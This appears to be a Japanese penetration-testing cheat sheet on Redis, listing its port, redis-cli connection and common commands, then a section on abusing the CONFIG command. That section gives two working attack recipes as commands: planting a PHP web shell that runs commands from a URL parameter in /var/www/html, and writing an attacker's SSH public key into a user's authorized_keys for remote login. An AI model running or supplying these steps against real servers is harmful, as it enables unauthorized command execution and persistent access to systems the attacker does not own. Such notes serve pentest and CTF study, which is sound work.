# Redisとは
メモリ上でデータを処理するインメモリ型のNoSQLデータベース。厳密にはインメモリ・データ構造ストアに分類される。

## ポート
6379

## 接続方法
```bash
redis-cli -h <ターゲット> -p <ポート>
```

## コマンド
```bash
keys * # キーを取得
get <キー> # キーに対応する値を取得
set <キー> <値> # キーに値を設定
hgetall <キー> # キーのハッシュを取得
info # バージョン情報などを取得
config get * # すべての設定パラメータを取得
config set dbfilname <パラメータ名> # 次に保存するパラメータ名を設定
save # メモリ上のデータをディスクへ保存
```

## configコマンドの悪用
configコマンドを使用できる場合、2通りの悪用方法がある。
1. webシェルの配置
```bash
config set dir /var/www/html
config set dbfilename webshell.php
set test <?php system($_GET['cmd']);?>
save # /webshell.php?cmd=whoami
```
2. sshの公開鍵の登録
```bash
config set dir <ユーザーのホームディレクトリ>/.ssh
# ターミナル
(sudo echo -e '\n'; cat <公開鍵>; echo -e '\n') > pub_key.txt
cat pub_key.txt | redis-cli -h <ターゲット> -x set ssh_key
redis-cli -h <ターゲット>
config set dbfilename authorized_keys
save
```
